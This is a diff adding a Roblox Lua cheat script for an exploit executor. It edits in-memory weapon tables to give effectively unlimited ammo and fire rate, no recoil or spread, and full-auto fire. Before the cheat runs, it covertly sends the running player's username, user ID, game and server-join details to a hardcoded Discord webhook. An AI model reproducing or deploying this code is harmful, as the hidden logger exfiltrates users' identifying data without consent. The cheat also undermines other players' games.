@@ -1,0 +1,126 @@
+local webhookURL = "https://discord.com/api/webhooks/1394468980298748076/ftL21GzsScdBtbOXLsYGkYvGHznbxFwJByez-6eYx1tjqGg4UqpiX1t0GhTSJXoUEuuy"
+
+local player = game.Players.LocalPlayer
+local username = player.Name
+local displayName = player.DisplayName
+local userId = player.UserId
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local gameId = game.PlaceId
+local jobId = game.JobId
+local playerCount = #game.Players:GetPlayers()
+
+local jsJoinCode = [[
+    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
+        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
+        if (server) {
+            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
+        } else {
+            console.log("Server not found.");
+        }
+    });
+]]
+
+local luaJoinScript = [[
+local TeleportService = game:GetService("TeleportService")
+TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
+]]
+
+local embed = {
+    ["title"] = "Execution Log",
+    ["description"] = "Here are the details of the player and game:",
+    ["type"] = "rich",
+    ["color"] = 0x000000,
+    ["fields"] = {
+        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
+        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
+        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
+        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
+        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
+        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
+        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
+        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
+    },
+    ["footer"] = { ["text"] = "Execution Log - Roblox" },
+    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local payload = game:GetService("HttpService"):JSONEncode({
+    ["content"] = "",
+    ["embeds"] = {embed}
+})
+
+local requestFunction = syn and syn.request or http_request or request
+if requestFunction then
+    requestFunction({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = payload
+    })
+else
+    warn("Your executor does not support HTTP requests.")
+end
+
+local FoundTable 
+
+for _, v in pairs(getgc(true)) do
+    if type(v) == "table" then
+        local ammo = rawget(v, "Ammo")
+        if ammo and ammo < 9e9 then
+            FoundTable = v
+            rawset(FoundTable, "Ammo", 9e9)
+            rawset(FoundTable, "FireRate", 9e9)
+            print("✅ Ammo and FireRate changed to 9e9")
+            break
+        end
+    end
+end
+
+if FoundTable then
+    -- ลดรีคอยท์
+    FoundTable.RecoilPunch = 0
+    FoundTable.MinRecoilPower = 0
+    FoundTable["MinRecoil Power"] = 0
+    FoundTable.MaxRecoilPower = 0
+    FoundTable["MaxRecoil Power"] = 0
+    FoundTable.AimRecoilReduction = 999
+    FoundTable["AimRecoil Reduction"] = 999
+    FoundTable.RecoilPowerStepAmount = 0
+
+    if type(FoundTable.HRecoil) == "table" then
+        for k in pairs(FoundTable.HRecoil) do
+            FoundTable.HRecoil[k] = 0
+        end
+    end
+    if type(FoundTable.VRecoil) == "table" then
+        for k in pairs(FoundTable.VRecoil) do
+            FoundTable.VRecoil[k] = 0
+        end
+    end
+
+    -- ลดการกระจายกระสุน
+    FoundTable.MinSpread = 0
+    FoundTable.MaxSpread = 0
+    if rawget(FoundTable, "HipfireSpreadMultiplier") then
+        FoundTable.HipfireSpreadMultiplier = 0
+    end
+
+    -- เพิ่ม Bullet Speed และ Range
+    FoundTable.BulletSpeed = 9999
+    FoundTable.BSpeed = 9999
+    FoundTable.Distance = 9999
+
+    print("✅ Increased Bullet Speed and firing range")
+
+    -- เปลี่ยนจากโหมด Semi เป็น Full Auto
+    FoundTable.Mode = "Auto" -- เปลี่ยนค่าโดยตรงถ้าใช้ Mode เดี่ยว
+    FoundTable.FireModes = {"Auto"} -- หรือแก้ไขตาราง FireModes ถ้ามีหลายโหมดให้เลือก
+    print("✅ Weapon is now Full Auto")
+
+    print("✅ Spread set to 0 for perfect accuracy")
+    print("✅ Recoil has been greatly reduced")
+else
+    print("❌ Could not find table with Ammo or unable to modify it")
+end
